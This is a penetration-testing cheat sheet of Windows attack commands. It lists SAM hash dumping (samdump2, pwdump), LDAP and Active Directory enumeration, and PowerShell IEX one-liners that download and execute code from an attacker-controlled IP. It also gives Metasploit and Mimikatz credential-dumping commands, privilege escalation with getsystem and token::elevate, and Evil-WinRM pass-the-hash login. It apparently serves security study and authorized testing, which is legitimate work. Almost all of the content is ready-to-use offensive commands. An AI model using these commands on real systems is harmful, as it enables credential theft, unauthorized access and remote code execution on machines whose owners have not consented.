### SAM (Security Account Manager)
A file that store Windows user credential. It can only be accessed when the Windows OS is not booted up. (Eg. from another OS) <br />
Passwords are LM & NTLM hashed <br />
```
Default file location: 
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM

Dumping hashes:
samdump2 SYSTEM SAM
pwdump.py SYSTEM SAM    # For Windows 10

Format of Hashes:
[USERNAME]:[RID]:[LMHash]:[NTLMHash]:::   # RID = Relative Identifier
```

Ref: https://techgenix.com/how-cracked-windows-password-part2/

### Active Directory & LDAP
Enum
```
nmap -n -sV --script "ldap* and not brute" [IP_ADDR]
ldapsearch -h [IP_ADDR] -x -b "dc=[DC],dc=[DC]"
windapsearch.py -d [DOMAIN] --dc-ip [IP_ADDR] -U    # -U to enumerate all AD users; -G for AD group enumerate
```
Ref: https://book.hacktricks.xyz/pentesting/pentesting-ldap

### PowerShell
```
C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt   # check powershell history
IEX ( IWR http://[IP_ADDR]/[PATH] -UseBasicParsing)   # equil linux wget http://[IP_ADDR]/[PATH] to upload file to the server
iwr http://[IP_ADDR]/[PATH] -OutFile [FILE]
IEX(New-Object Net.Webclient).downloadString('http://[IP_ADDR]/[PATH]')
```

### Metasploit
```
getsystem
load kiwi   # mimikatz
lsa_dump_sam
```

### iCACLS.exe
```
Change file and folder permission 
icacls [FILE] /grant [USERNAME]:F   # :F for full access
```
Ref: https://ss64.com/nt/icacls.html

### RPC Dump
```
rpcdump.py [USERNAME]@[IP_ADDR]
```

### Evil-WinRM
```
evil-winrm -i [IP_ADDR] -u [USERNAME] -H [HASH]   # hash retrievable from secretsdump.py machines/smb
```

### Tcpdump
```
tcpdump -i tun0 icmp -v   # listen for icmp ping to tun0 interface
```

### Mimikatz
```
privilege::debug
token::elevate
lsadump::sam
```
